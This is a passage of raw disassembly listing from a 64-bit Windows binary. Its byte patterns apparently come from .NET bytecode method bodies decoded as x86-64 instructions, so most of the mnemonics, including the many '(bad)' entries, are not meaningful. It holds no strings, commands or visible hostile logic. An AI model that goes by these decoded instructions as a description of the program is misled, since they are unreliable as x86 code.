   1400078b2:	01 00                	add    %eax,(%rax)
   1400078b4:	0b 00                	or     (%rax),%eax
   1400078b6:	00 00                	add    %al,(%rax)
   1400078b8:	00 00                	add    %al,(%rax)
   1400078ba:	00 00                	add    %al,(%rax)
   1400078bc:	28 84 00 00 06 28 25 	sub    %al,0x25280600(%rax,%rax,1)
   1400078c3:	00 00                	add    %al,(%rax)
   1400078c5:	0a 2a                	or     (%rdx),%ch
   1400078c7:	cc                   	int3
   1400078c8:	03 30                	add    (%rax),%esi
   1400078ca:	01 00                	add    %eax,(%rax)
   1400078cc:	0b 00                	or     (%rax),%eax
   1400078ce:	00 00                	add    %al,(%rax)
   1400078d0:	00 00                	add    %al,(%rax)
   1400078d2:	00 00                	add    %al,(%rax)
   1400078d4:	28 84 00 00 06 28 26 	sub    %al,0x26280600(%rax,%rax,1)
   1400078db:	00 00                	add    %al,(%rax)
   1400078dd:	0a 2a                	or     (%rdx),%ch
   1400078df:	cc                   	int3
   1400078e0:	03 30                	add    (%rax),%esi
   1400078e2:	01 00                	add    %eax,(%rax)
   1400078e4:	12 00                	adc    (%rax),%al
   1400078e6:	00 00                	add    %al,(%rax)
   1400078e8:	4f 00 00             	rex.WRXB add %r8b,(%r8)
   1400078eb:	11 16                	adc    %edx,(%rsi)
   1400078ed:	0a 28                	or     (%rax),%ch
   1400078ef:	86 00                	xchg   %al,(%rax)
   1400078f1:	00 06                	add    %al,(%rsi)
   1400078f3:	2c 07                	sub    $0x7,%al
   1400078f5:	28 89 00 00 06 17    	sub    %cl,0x17060000(%rcx)
   1400078fb:	0a 06                	or     (%rsi),%al
   1400078fd:	2a cc                	sub    %ah,%cl
   1400078ff:	cc                   	int3
   140007900:	03 30                	add    (%rax),%esi
   140007902:	01 00                	add    %eax,(%rax)
   140007904:	12 00                	adc    (%rax),%al
   140007906:	00 00                	add    %al,(%rax)
   140007908:	4f 00 00             	rex.WRXB add %r8b,(%r8)
   14000790b:	11 16                	adc    %edx,(%rsi)
   14000790d:	0a 28                	or     (%rax),%ch
   14000790f:	86 00                	xchg   %al,(%rax)
   140007911:	00 06                	add    %al,(%rsi)
   140007913:	2c 07                	sub    $0x7,%al
   140007915:	28 8a 00 00 06 17    	sub    %cl,0x17060000(%rdx)
   14000791b:	0a 06                	or     (%rsi),%al
   14000791d:	2a cc                	sub    %ah,%cl
   14000791f:	cc                   	int3
   140007920:	03 30                	add    (%rax),%esi
   140007922:	00 00                	add    %al,(%rax)
   140007924:	06                   	(bad)
   140007925:	00 00                	add    %al,(%rax)
   140007927:	00 00                	add    %al,(%rax)
   140007929:	00 00                	add    %al,(%rax)
   14000792b:	00 28                	add    %ch,(%rax)
   14000792d:	88 00                	mov    %al,(%rax)
   14000792f:	00 06                	add    %al,(%rsi)
   140007931:	2a cc                	sub    %ah,%cl
   140007933:	cc                   	int3
   140007934:	0b 30                	or     (%rax),%esi
   140007936:	04 00                	add    $0x0,%al
   140007938:	1e                   	(bad)
   140007939:	01 00                	add    %eax,(%rax)
   14000793b:	00 55 00             	add    %dl,0x0(%rbp)
   14000793e:	00 11                	add    %dl,(%rcx)
   140007940:	16                   	(bad)
   140007941:	6a 13                	push   $0x13
   140007943:	06                   	(bad)
   140007944:	02 2d 02 15 2a 28    	add    0x282a1502(%rip),%ch        # 0x1682a8e4c
   14000794a:	8b 00                	mov    (%rax),%eax
   14000794c:	00 06                	add    %al,(%rsi)
   14000794e:	17                   	(bad)
   14000794f:	40 ff 00             	rex incl (%rax)
   140007952:	00 00                	add    %al,(%rax)
   140007954:	05 4c 28 95 00       	add    $0x95284c,%eax
   140007959:	00 06                	add    %al,(%rsi)
   14000795b:	0b 04 4c             	or     (%rsp,%rcx,2),%eax
   14000795e:	28 95 00 00 06 0a    	sub    %dl,0xa060000(%rbp)
   140007964:	06                   	(bad)
   140007965:	07                   	(bad)
   140007966:	59                   	pop    %rcx
   140007967:	13 05 03 4c 17 6a    	adc    0x6a174c03(%rip),%eax        # 0x1aa17c570
   14000796d:	59                   	pop    %rcx
   14000796e:	11 05 19 64 41 ad    	adc    %eax,-0x52be9be7(%rip)        # 0xed41dd8d
   140007974:	00 00                	add    %al,(%rax)
   140007976:	00 03                	add    %al,(%rbx)
   140007978:	4c 1e                	rex.WR (bad)
   14000797a:	6a 5a                	push   $0x5a
   14000797c:	0d 09 20 00 10       	or     $0x10002009,%eax
   140007981:	00 00                	add    %al,(%rax)
   140007983:	6a 37                	push   $0x37
   140007985:	08 20                	or     %ah,(%rax)
   140007987:	00 10                	add    %dl,(%rax)
   140007989:	00 00                	add    %al,(%rax)
   14000798b:	6a 2b                	push   $0x2b
   14000798d:	01 09                	add    %ecx,(%rcx)
   14000798f:	13 0c 12             	adc    (%rdx,%rdx,1),%ecx
   140007992:	0b 09                	or     (%rcx),%ecx
   140007994:	11 0c 58             	adc    %ecx,(%rax,%rbx,2)
   140007997:	69 28 30 00 00 0a    	imul   $0xa000030,(%rax),%ebp
   14000799d:	12 0a                	adc    (%rdx),%cl
   14000799f:	07                   	(bad)
   1400079a0:	28 06                	sub    %al,(%rsi)
   1400079a2:	00 00                	add    %al,(%rax)
   1400079a4:	0a 11                	or     (%rcx),%dl
   1400079a6:	0a 11                	or     (%rcx),%dl
   1400079a8:	0b 28                	or     (%rax),%ebp
   1400079aa:	2f                   	(bad)
   1400079ab:	00 00                	add    %al,(%rax)
   1400079ad:	0a 13                	or     (%rbx),%dl
   1400079af:	0e                   	(bad)
   1400079b0:	12 0e                	adc    (%rsi),%cl
   1400079b2:	28 31                	sub    %dh,(%rcx)
   1400079b4:	00 00                	add    %al,(%rax)
   1400079b6:	0a 11                	or     (%rcx),%dl
   1400079b8:	05 58 0a 12 0e       	add    $0xe120a58,%eax
   1400079bd:	28 31                	sub    %dh,(%rcx)
   1400079bf:	00 00                	add    %al,(%rax)
   1400079c1:	0a 0b                	or     (%rbx),%cl
   1400079c3:	03 4c 0c 20          	add    0x20(%rsp,%rcx,1),%ecx
   1400079c7:	00 02                	add    %al,(%rdx)
   1400079c9:	00 00                	add    %al,(%rax)
   1400079cb:	6a 08                	push   $0x8
   1400079cd:	37                   	(bad)
   1400079ce:	03 08                	add    (%rax),%ecx
   1400079d0:	2b 06                	sub    (%rsi),%eax
   1400079d2:	20 00                	and    %al,(%rax)
   1400079d4:	02 00                	add    (%rax),%al
   1400079d6:	00 6a 13             	add    %ch,0x13(%rdx)
   1400079d9:	09 03                	or     %eax,(%rbx)
   1400079db:	08 11                	or     %dl,(%rcx)
   1400079dd:	09 58 55             	or     %ebx,0x55(%rax)
   1400079e0:	de 42 26             	fiadds 0x26(%rdx)
   1400079e3:	12 08                	adc    (%rax),%cl
   1400079e5:	03 4c 1e 6a          	add    0x6a(%rsi,%rbx,1),%ecx
   1400079e9:	5a                   	pop    %rdx
   1400079ea:	1f                   	(bad)
   1400079eb:	0c 6a                	or     $0x6a,%al
   1400079ed:	58                   	pop    %rax
   1400079ee:	69 28 30 00 00 0a    	imul   $0xa000030,(%rax),%ebp
   1400079f4:	12 07                	adc    (%rdi),%al
   1400079f6:	07                   	(bad)
   1400079f7:	28 06                	sub    %al,(%rsi)
   1400079f9:	00 00                	add    %al,(%rax)
   1400079fb:	0a 11                	or     (%rcx),%dl
   1400079fd:	07                   	(bad)
   1400079fe:	11 08                	adc    %ecx,(%rax)
   140007a00:	28 2f                	sub    %ch,(%rdi)
   140007a02:	00 00                	add    %al,(%rax)
   140007a04:	0a 13                	or     (%rbx),%dl
   140007a06:	0d 12 0d 28 31       	or     $0x31280d12,%eax
   140007a0b:	00 00                	add    %al,(%rax)
   140007a0d:	0a 07                	or     (%rdi),%al
   140007a0f:	59                   	pop    %rcx
   140007a10:	06                   	(bad)
   140007a11:	58                   	pop    %rax
   140007a12:	0a 12                	or     (%rdx),%dl
   140007a14:	0d 28 31 00 00       	or     $0x3128,%eax
   140007a19:	0a 0b                	or     (%rbx),%cl
   140007a1b:	03 25 4c 1a 6a 58    	add    0x586a1a4c(%rip),%esp        # 0x1986a946d
   140007a21:	55                   	push   %rbp
   140007a22:	de 00                	fiadds (%rax)
   140007a24:	06                   	(bad)
   140007a25:	02 55 06             	add    0x6(%rbp),%dl
   140007a28:	1e                   	(bad)
   140007a29:	6a 58                	push   $0x58
   140007a2b:	0a 02                	or     (%rdx),%al
   140007a2d:	13 06                	adc    (%rsi),%eax
   140007a2f:	05 07 28 96 00       	add    $0x962807,%eax
   140007a34:	00 06                	add    %al,(%rsi)
   140007a36:	55                   	push   %rbp
   140007a37:	04 06                	add    $0x6,%al
   140007a39:	28 96 00 00 06 55    	sub    %dl,0x55060000(%rsi)
   140007a3f:	de 05 26 de 00 de    	fiadds -0x21ff21da(%rip)        # 0x11e01586b
   140007a45:	09 de                	or     %ebx,%esi
   140007a47:	07                   	(bad)
   140007a48:	28 8c 00 00 06 26 dc 	sub    %cl,-0x23d9fa00(%rax,%rax,1)
   140007a4f:	11 06                	adc    %eax,(%rsi)
   140007a51:	2d 05 15 13 04       	sub    $0x4131505,%eax
   140007a56:	2b 03                	sub    (%rbx),%eax
   140007a58:	16                   	(bad)
   140007a59:	13 04 11             	adc    (%rcx,%rdx,1),%eax
   140007a5c:	04 2a                	add    $0x2a,%al
   140007a5e:	00 00                	add    %al,(%rax)
   140007a60:	41                   	rex.B
   140007a61:	4c 00 00             	rex.WR add %r8b,(%rax)
   140007a64:	00 00                	add    %al,(%rax)
   140007a66:	00 00                	add    %al,(%rax)
   140007a68:	37                   	(bad)
   140007a69:	00 00                	add    %al,(%rax)
   140007a6b:	00 6b 00             	add    %ch,0x0(%rbx)
   140007a6e:	00 00                	add    %al,(%rax)
   140007a70:	a2 00 00 00 42 00 00 	movabs %al,0x2a00000042000000
   140007a77:	00 2a 
   140007a79:	00 00                	add    %al,(%rax)
   140007a7b:	01 00                	add    %eax,(%rax)
   140007a7d:	00 00                	add    %al,(%rax)
   140007a7f:	00 14 00             	add    %dl,(%rax,%rax,1)
   140007a82:	00 00                	add    %al,(%rax)
   140007a84:	ed                   	in     (%dx),%eax
   140007a85:	00 00                	add    %al,(%rax)
   140007a87:	00 01                	add    %al,(%rcx)
   140007a89:	01 00                	add    %eax,(%rax)
   140007a8b:	00 03                	add    %al,(%rbx)
   140007a8d:	00 00                	add    %al,(%rax)
   140007a8f:	00 2a                	add    %ch,(%rdx)
   140007a91:	00 00                	add    %al,(%rax)
   140007a93:	01 02                	add    %eax,(%rdx)
   140007a95:	00 00                	add    %al,(%rax)
   140007a97:	00 14 00             	add    %dl,(%rax,%rax,1)
   140007a9a:	00 00                	add    %al,(%rax)
   140007a9c:	f4                   	hlt
   140007a9d:	00 00                	add    %al,(%rax)
   140007a9f:	00 08                	add    %cl,(%rax)
   140007aa1:	01 00                	add    %eax,(%rax)
   140007aa3:	00 07                	add    %al,(%rdi)
   140007aa5:	00 00                	add    %al,(%rax)
   140007aa7:	00 31                	add    %dh,(%rcx)
   140007aa9:	00 00                	add    %al,(%rax)
   140007aab:	01 03                	add    %eax,(%rbx)
   140007aad:	30 03                	xor    %al,(%rbx)
   140007aaf:	00 a2 00 00 00 56    	add    %ah,0x56000000(%rdx)
   140007ab5:	00 00                	add    %al,(%rax)
   140007ab7:	11 7e 64             	adc    %edi,0x64(%rsi)
   140007aba:	00 00                	add    %al,(%rax)
   140007abc:	04 39                	add    $0x39,%al
   140007abe:	97                   	xchg   %eax,%edi
   140007abf:	00 00                	add    %al,(%rax)
   140007ac1:	00 7e 63             	add    %bh,0x63(%rsi)
   140007ac4:	00 00                	add    %al,(%rax)
   140007ac6:	04 28                	add    $0x28,%al
   140007ac8:	95                   	xchg   %eax,%ebp
   140007ac9:	00 00                	add    %al,(%rax)
   140007acb:	06                   	(bad)
   140007acc:	0b 7e 68             	or     0x68(%rsi),%edi
   140007acf:	00 00                	add    %al,(%rax)
   140007ad1:	04 28                	add    $0x28,%al
   140007ad3:	95                   	xchg   %eax,%ebp
   140007ad4:	00 00                	add    %al,(%rax)
   140007ad6:	06                   	(bad)
   140007ad7:	0a 07                	or     (%rdi),%al
   140007ad9:	21 ff                	and    %edi,%edi
   140007adb:	ff                   	(bad)
   140007adc:	ff                   	(bad)
   140007add:	ff                   	(bad)
   140007ade:	ff                   	(bad)
   140007adf:	ff                   	(bad)
   140007ae0:	ff                   	(bad)
   140007ae1:	ff 2e                	ljmp   *(%rsi)
   140007ae3:	70 07                	jo     0x140007aec
   140007ae5:	2c 6d                	sub    $0x6d,%al
   140007ae7:	06                   	(bad)
   140007ae8:	2c 6a                	sub    $0x6a,%al
   140007aea:	07                   	(bad)
   140007aeb:	13 05 06 13 04 06    	adc    0x6041306(%rip),%eax        # 0x146048df7
   140007af1:	1e                   	(bad)
   140007af2:	6a 59                	push   $0x59
   140007af4:	0a 06                	or     (%rsi),%al
   140007af6:	07                   	(bad)
   140007af7:	37                   	(bad)
   140007af8:	4c 06                	rex.WR (bad)
   140007afa:	4c 16                	rex.WR (bad)
   140007afc:	6a 28                	push   $0x28
   140007afe:	96                   	xchg   %eax,%esi
   140007aff:	00 00                	add    %al,(%rax)
   140007b01:	06                   	(bad)
   140007b02:	2e ec                	cs in  (%dx),%al
   140007b04:	06                   	(bad)
   140007b05:	4c 28 95 00 00 06 06 	rex.WR sub %r10b,0x6060000(%rbp)
   140007b0c:	16                   	(bad)
   140007b0d:	6a 28                	push   $0x28
   140007b0f:	96                   	xchg   %eax,%esi
   140007b10:	00 00                	add    %al,(%rax)
   140007b12:	06                   	(bad)
   140007b13:	55                   	push   %rbp
   140007b14:	29 49 00             	sub    %ecx,0x0(%rcx)
   140007b17:	00 11                	add    %dl,(%rcx)
   140007b19:	7e 63                	jle    0x140007b7e
   140007b1b:	00 00                	add    %al,(%rax)
   140007b1d:	04 28                	add    $0x28,%al
   140007b1f:	95                   	xchg   %eax,%ebp
   140007b20:	00 00                	add    %al,(%rax)
   140007b22:	06                   	(bad)
   140007b23:	0d 7e 68 00 00       	or     $0x687e,%eax
   140007b28:	04 28                	add    $0x28,%al
   140007b2a:	95                   	xchg   %eax,%ebp
   140007b2b:	00 00                	add    %al,(%rax)
   140007b2d:	06                   	(bad)
   140007b2e:	0c 11                	or     $0x11,%al
   140007b30:	05 09 33 05 11       	add    $0x11053309,%eax
   140007b35:	04 08                	add    $0x8,%al
   140007b37:	2e b7 09             	cs mov $0x9,%bh
   140007b3a:	13 05 09 0b 08 13    	adc    0x13080b09(%rip),%eax        # 0x153088649
   140007b40:	04 08                	add    $0x8,%al
   140007b42:	0a 2b                	or     (%rbx),%ch
   140007b44:	ab                   	stos   %eax,(%rdi)
   140007b45:	12 06                	adc    (%rsi),%al
   140007b47:	07                   	(bad)
   140007b48:	28 06                	sub    %al,(%rsi)
   140007b4a:	00 00                	add    %al,(%rax)
   140007b4c:	0a 11                	or     (%rcx),%dl
   140007b4e:	06                   	(bad)
   140007b4f:	28 2e                	sub    %ch,(%rsi)
   140007b51:	00 00                	add    %al,(%rax)
   140007b53:	0a 28                	or     (%rax),%ch
   140007b55:	8e 00                	mov    (%rax),%es
   140007b57:	00 06                	add    %al,(%rsi)
   140007b59:	2a cc                	sub    %ah,%cl
   140007b5b:	cc                   	int3
   140007b5c:	03 30                	add    (%rax),%esi
   140007b5e:	04 00                	add    $0x0,%al
   140007b60:	1b 00                	sbb    (%rax),%eax
   140007b62:	00 00                	add    %al,(%rax)
   140007b64:	00 00                	add    %al,(%rax)
   140007b66:	00 00                	add    %al,(%rax)
   140007b68:	02 28                	add    (%rax),%ch
   140007b6a:	96                   	xchg   %eax,%esi
   140007b6b:	00 00                	add    %al,(%rax)
   140007b6d:	06                   	(bad)
   140007b6e:	7f 64                	jg     0x140007bd4
   140007b70:	00 00                	add    %al,(%rax)
   140007b72:	04 7f                	add    $0x7f,%al
   140007b74:	68 00 00 04 7f       	push   $0x7f040000
   140007b79:	63 00                	movsxd (%rax),%eax
   140007b7b:	00 04 28             	add    %al,(%rax,%rbp,1)
   140007b7e:	8f 00                	pop    (%rax)
   140007b80:	00 06                	add    %al,(%rsi)
   140007b82:	2a cc                	sub    %ah,%cl
   140007b84:	0b 30                	or     (%rax),%esi
   140007b86:	03 00                	add    (%rax),%eax
   140007b88:	b7 00                	mov    $0x0,%bh
   140007b8a:	00 00                	add    %al,(%rax)
   140007b8c:	57                   	push   %rdi
   140007b8d:	00 00                	add    %al,(%rax)
   140007b8f:	11 7e 69             	adc    %edi,0x69(%rsi)
   140007b92:	00 00                	add    %al,(%rax)
   140007b94:	04 39                	add    $0x39,%al
   140007b96:	ac                   	lods   (%rsi),%al
   140007b97:	00 00                	add    %al,(%rax)
   140007b99:	00 7e 6a             	add    %bh,0x6a(%rsi)
   140007b9c:	00 00                	add    %al,(%rax)
   140007b9e:	04 28                	add    $0x28,%al
   140007ba0:	95                   	xchg   %eax,%ebp
   140007ba1:	00 00                	add    %al,(%rax)
   140007ba3:	06                   	(bad)
   140007ba4:	0b 7e 65             	or     0x65(%rsi),%edi
   140007ba7:	00 00                	add    %al,(%rax)
   140007ba9:	04 28                	add    $0x28,%al
   140007bab:	95                   	xchg   %eax,%ebp
   140007bac:	00 00                	add    %al,(%rax)
   140007bae:	06                   	(bad)
   140007baf:	0a 07                	or     (%rdi),%al
   140007bb1:	21 ff                	and    %edi,%edi
   140007bb3:	ff                   	(bad)
   140007bb4:	ff                   	(bad)
   140007bb5:	ff                   	(bad)
   140007bb6:	ff                   	(bad)
   140007bb7:	ff                   	(bad)
   140007bb8:	ff                   	(bad)
   140007bb9:	ff 2e                	ljmp   *(%rsi)
   140007bbb:	73 07                	jae    0x140007bc4
   140007bbd:	2c 70                	sub    $0x70,%al
   140007bbf:	06                   	(bad)
   140007bc0:	2c 6d                	sub    $0x6d,%al
   140007bc2:	16                   	(bad)
   140007bc3:	6a 13                	push   $0x13
   140007bc5:	09 07                	or     %eax,(%rdi)
   140007bc7:	13 05 06 13 04 16    	adc    0x16041306(%rip),%eax        # 0x156048ed3
   140007bcd:	6a 13                	push   $0x13
   140007bcf:	08 16                	or     %dl,(%rsi)
   140007bd1:	6a 13                	push   $0x13
   140007bd3:	07                   	(bad)
   140007bd4:	06                   	(bad)
   140007bd5:	1e                   	(bad)
   140007bd6:	6a 59                	push   $0x59
   140007bd8:	0a 06                	or     (%rsi),%al
   140007bda:	07                   	(bad)
   140007bdb:	37                   	(bad)
   140007bdc:	0d 06 4c 16 6a       	or     $0x6a164c06,%eax
   140007be1:	28 96 00 00 06 33    	sub    %dl,0x33060000(%rsi)
   140007be7:	02 2b                	add    (%rbx),%ch
   140007be9:	ea                   	(bad)
   140007bea:	06                   	(bad)
   140007beb:	07                   	(bad)
   140007bec:	37                   	(bad)
   140007bed:	41 06                	rex.B (bad)
   140007bef:	4c 28 95 00 00 06 06 	rex.WR sub %r10b,0x6060000(%rbp)
   140007bf6:	16                   	(bad)
   140007bf7:	6a 28                	push   $0x28
   140007bf9:	96                   	xchg   %eax,%esi
   140007bfa:	00 00                	add    %al,(%rax)
   140007bfc:	06                   	(bad)
   140007bfd:	55                   	push   %rbp
   140007bfe:	29 49 00             	sub    %ecx,0x0(%rcx)
   140007c01:	00 11                	add    %dl,(%rcx)
   140007c03:	7e 6a                	jle    0x140007c6f
   140007c05:	00 00                	add    %al,(%rax)
   140007c07:	04 28                	add    $0x28,%al
   140007c09:	95                   	xchg   %eax,%ebp
   140007c0a:	00 00                	add    %al,(%rax)
   140007c0c:	06                   	(bad)
   140007c0d:	0d 7e 65 00 00       	or     $0x657e,%eax
   140007c12:	04 28                	add    $0x28,%al
   140007c14:	95                   	xchg   %eax,%ebp
   140007c15:	00 00                	add    %al,(%rax)
   140007c17:	06                   	(bad)
   140007c18:	0c 11                	or     $0x11,%al
   140007c1a:	05 09 33 05 11       	add    $0x11053309,%eax
   140007c1f:	04 08                	add    $0x8,%al
   140007c21:	2e 0a 09             	cs or  (%rcx),%cl
   140007c24:	13 05 09 0b 08 13    	adc    0x13080b09(%rip),%eax        # 0x153088733
   140007c2a:	04 08                	add    $0x8,%al
   140007c2c:	0a 2b                	or     (%rbx),%ch
   140007c2e:	9d                   	popf
   140007c2f:	de 15 12 06 07 28    	ficoms 0x28070612(%rip)        # 0x168078247
   140007c35:	06                   	(bad)
   140007c36:	00 00                	add    %al,(%rax)
   140007c38:	0a 11                	or     (%rcx),%dl
   140007c3a:	06                   	(bad)
   140007c3b:	28 2e                	sub    %ch,(%rsi)
   140007c3d:	00 00                	add    %al,(%rax)
   140007c3f:	0a 28                	or     (%rax),%ch
   140007c41:	8e 00                	mov    (%rax),%es
   140007c43:	00 06                	add    %al,(%rsi)
   140007c45:	dc 2a                	fsubrl (%rdx)
   140007c47:	00 41 1c             	add    %al,0x1c(%rcx)
   140007c4a:	00 00                	add    %al,(%rax)
   140007c4c:	02 00                	add    (%rax),%al
   140007c4e:	00 00                	add    %al,(%rax)
   140007c50:	20 00                	and    %al,(%rax)
   140007c52:	00 00                	add    %al,(%rax)
   140007c54:	81 00 00 00 a1 00    	addl   $0xa10000,(%rax)
   140007c5a:	00 00                	add    %al,(%rax)
   140007c5c:	15 00 00 00 31       	adc    $0x31000000,%eax
   140007c61:	00 00                	add    %al,(%rax)
   140007c63:	01 03                	add    %eax,(%rbx)
   140007c65:	30 01                	xor    %al,(%rcx)
   140007c67:	00 0e                	add    %cl,(%rsi)
   140007c69:	00 00                	add    %al,(%rax)
   140007c6b:	00 00                	add    %al,(%rax)
   140007c6d:	00 00                	add    %al,(%rax)
   140007c6f:	00 16                	add    %dl,(%rsi)
   140007c71:	6a 80                	push   $0xffffffffffffff80
   140007c73:	66 00 00             	data16 add %al,(%rax)
   140007c76:	04 02                	add    $0x2,%al
   140007c78:	28 83 00 00 06 2a    	sub    %al,0x2a060000(%rbx)
   140007c7e:	cc                   	int3
   140007c7f:	cc                   	int3
   140007c80:	03 30                	add    (%rax),%esi
   140007c82:	02 00                	add    (%rax),%al
   140007c84:	24 00                	and    $0x0,%al
   140007c86:	00 00                	add    %al,(%rax)
   140007c88:	00 00                	add    %al,(%rax)
   140007c8a:	00 00                	add    %al,(%rax)
   140007c8c:	28 86 00 00 06 2d    	sub    %al,0x2d060000(%rsi)
   140007c92:	10 73 05             	adc    %dh,0x5(%rbx)
   140007c95:	00 00                	add    %al,(%rax)
   140007c97:	0a 28                	or     (%rax),%ch
   140007c99:	82                   	(bad)
   140007c9a:	00 00                	add    %al,(%rax)
   140007c9c:	06                   	(bad)
   140007c9d:	16                   	(bad)
   140007c9e:	80 67 00 00          	andb   $0x0,0x0(%rdi)
   140007ca2:	04 7e                	add    $0x7e,%al
   140007ca4:	67 00 00             	add    %al,(%eax)
   140007ca7:	04 17                	add    $0x17,%al
   140007ca9:	58                   	pop    %rax
   140007caa:	80 67 00 00          	andb   $0x0,0x0(%rdi)
   140007cae:	04 2a                	add    $0x2a,%al
   140007cb0:	03 30                	add    (%rax),%esi
   140007cb2:	01 00                	add    %eax,(%rax)
   140007cb4:	0b 00                	or     (%rax),%eax
   140007cb6:	00 00                	add    %al,(%rax)
   140007cb8:	00 00                	add    %al,(%rax)
   140007cba:	00 00                	add    %al,(%rax)
   140007cbc:	28 87 00 00 06 28    	sub    %al,0x28060000(%rdi)
   140007cc2:	86 00                	xchg   %al,(%rax)
   140007cc4:	00 06                	add    %al,(%rsi)
   140007cc6:	2a cc                	sub    %ah,%cl
   140007cc8:	03 30                	add    (%rax),%esi
   140007cca:	03 00                	add    (%rax),%eax
   140007ccc:	3a 00                	cmp    (%rax),%al
   140007cce:	00 00                	add    %al,(%rax)
   140007cd0:	4a 00 00             	rex.WX add %al,(%rax)
   140007cd3:	11 16                	adc    %edx,(%rsi)
   140007cd5:	28 8d 00 00 06 17    	sub    %cl,0x17060000(%rbp)
   140007cdb:	33 30                	xor    (%rax),%esi
   140007cdd:	26 20 00             	es and %al,(%rax)
   140007ce0:	01 00                	add    %eax,(%rax)
   140007ce2:	00 28                	add    %ch,(%rax)
   140007ce4:	2d 00 00 0a 0a       	sub    $0xa0a0000,%eax
   140007ce9:	12 00                	adc    (%rax),%al
   140007ceb:	28 31                	sub    %dh,(%rcx)
   140007ced:	00 00                	add    %al,(%rax)
   140007cef:	0a 28                	or     (%rax),%ch
   140007cf1:	96                   	xchg   %eax,%esi
   140007cf2:	00 00                	add    %al,(%rax)
   140007cf4:	06                   	(bad)
   140007cf5:	80 63 00 00          	andb   $0x0,0x0(%rbx)
   140007cf9:	04 7e                	add    $0x7e,%al
   140007cfb:	63 00                	movsxd (%rax),%eax
   140007cfd:	00 04 80             	add    %al,(%rax,%rax,4)
   140007d00:	68 00 00 04 1f       	push   $0x1f040000
   140007d05:	20 6a 80             	and    %ch,-0x80(%rdx)
   140007d08:	64 00 00             	add    %al,%fs:(%rax)
   140007d0b:	04 17                	add    $0x17,%al
   140007d0d:	2a cc                	sub    %ah,%cl
   140007d0f:	cc                   	int3
   140007d10:	03 30                	add    (%rax),%esi
   140007d12:	02 00                	add    (%rax),%al
   140007d14:	38 00                	cmp    %al,(%rax)
   140007d16:	00 00                	add    %al,(%rax)
   140007d18:	4a 00 00             	rex.WX add %al,(%rax)
   140007d1b:	11 28                	adc    %ebp,(%rax)
   140007d1d:	8d 00                	lea    (%rax),%eax
   140007d1f:	00 06                	add    %al,(%rsi)
   140007d21:	17                   	(bad)
   140007d22:	33 2e                	xor    (%rsi),%ebp
   140007d24:	20 00                	and    %al,(%rax)
   140007d26:	01 00                	add    %eax,(%rax)
   140007d28:	00 28                	add    %ch,(%rax)
   140007d2a:	2d 00 00 0a 0a       	sub    $0xa0a0000,%eax
   140007d2f:	12 00                	adc    (%rax),%al
   140007d31:	28 31                	sub    %dh,(%rcx)
   140007d33:	00 00                	add    %al,(%rax)
   140007d35:	0a 28                	or     (%rax),%ch
   140007d37:	96                   	xchg   %eax,%esi
   140007d38:	00 00                	add    %al,(%rax)
   140007d3a:	06                   	(bad)
   140007d3b:	80 6a 00 00          	subb   $0x0,0x0(%rdx)
   140007d3f:	04 7e                	add    $0x7e,%al
   140007d41:	6a 00                	push   $0x0
   140007d43:	00 04 80             	add    %al,(%rax,%rax,4)
   140007d46:	65 00 00             	add    %al,%gs:(%rax)
   140007d49:	04 1f                	add    $0x1f,%al
   140007d4b:	20 6a 80             	and    %ch,-0x80(%rdx)
   140007d4e:	69 00 00 04 17 2a    	imul   $0x2a170400,(%rax),%eax
   140007d54:	03 30                	add    (%rax),%esi
   140007d56:	02 00                	add    (%rax),%al
   140007d58:	08 00                	or     %al,(%rax)
   140007d5a:	00 00                	add    %al,(%rax)
   140007d5c:	00 00                	add    %al,(%rax)
   140007d5e:	00 00                	add    %al,(%rax)
   140007d60:	02 03                	add    (%rbx),%al
   140007d62:	28 4c 00 00          	sub    %cl,0x0(%rax,%rax,1)
   140007d66:	0a 2a                	or     (%rdx),%ch
   140007d68:	03 30                	add    (%rax),%esi
   140007d6a:	03 00                	add    (%rax),%eax
   140007d6c:	09 00                	or     %eax,(%rax)
   140007d6e:	00 00                	add    %al,(%rax)
   140007d70:	00 00                	add    %al,(%rax)
   140007d72:	00 00                	add    %al,(%rax)
   140007d74:	02 03                	add    (%rbx),%al
   140007d76:	04 28                	add    $0x28,%al
   140007d78:	4b 00 00             	rex.WXB add %al,(%r8)
   140007d7b:	0a 2a                	or     (%rdx),%ch
   140007d7d:	cc                   	int3
   140007d7e:	cc                   	int3
   140007d7f:	cc                   	int3
   140007d80:	03 30                	add    (%rax),%esi
   140007d82:	03 00                	add    (%rax),%eax
   140007d84:	09 00                	or     %eax,(%rax)
   140007d86:	00 00                	add    %al,(%rax)
   140007d88:	00 00                	add    %al,(%rax)
   140007d8a:	00 00                	add    %al,(%rax)
   140007d8c:	02 03                	add    (%rbx),%al
   140007d8e:	04 28                	add    $0x28,%al
   140007d90:	4a 00 00             	rex.WX add %al,(%rax)
   140007d93:	0a 2a                	or     (%rdx),%ch
   140007d95:	cc                   	int3
   140007d96:	cc                   	int3
   140007d97:	cc                   	int3
   140007d98:	03 30                	add    (%rax),%esi
   140007d9a:	01 00                	add    %eax,(%rax)
   140007d9c:	07                   	(bad)
   140007d9d:	00 00                	add    %al,(%rax)
   140007d9f:	00 00                	add    %al,(%rax)
   140007da1:	00 00                	add    %al,(%rax)
   140007da3:	00 02                	add    %al,(%rdx)
   140007da5:	7b d6                	jnp    0x140007d7d
   140007da7:	00 00                	add    %al,(%rax)
   140007da9:	04 2a                	add    $0x2a,%al
   140007dab:	cc                   	int3
   140007dac:	03 30                	add    (%rax),%esi
   140007dae:	02 00                	add    (%rax),%al
   140007db0:	08 00                	or     %al,(%rax)
   140007db2:	00 00                	add    %al,(%rax)
   140007db4:	00 00                	add    %al,(%rax)
   140007db6:	00 00                	add    %al,(%rax)
   140007db8:	02 03                	add    (%rbx),%al
   140007dba:	7d d6                	jge    0x140007d92
   140007dbc:	00 00                	add    %al,(%rax)
   140007dbe:	04 2a                	add    $0x2a,%al
   140007dc0:	03 30                	add    (%rax),%esi
   140007dc2:	03 00                	add    (%rax),%eax
   140007dc4:	a1 00 00 00 60 00 00 	movabs 0x211000060000000,%eax
   140007dcb:	11 02 
   140007dcd:	6f                   	outsl  (%rsi),(%dx)
   140007dce:	51                   	push   %rcx
   140007dcf:	00 00                	add    %al,(%rax)
   140007dd1:	0a 2c 0e             	or     (%rsi,%rcx,1),%ch
   140007dd4:	02 6f 51             	add    0x51(%rdi),%ch
   140007dd7:	00 00                	add    %al,(%rax)
   140007dd9:	0a 6f 4d             	or     0x4d(%rdi),%ch
   140007ddc:	00 00                	add    %al,(%rax)
   140007dde:	0a 0c 2b             	or     (%rbx,%rbp,1),%cl
   140007de1:	06                   	(bad)
   140007de2:	7e 46                	jle    0x140007e2a
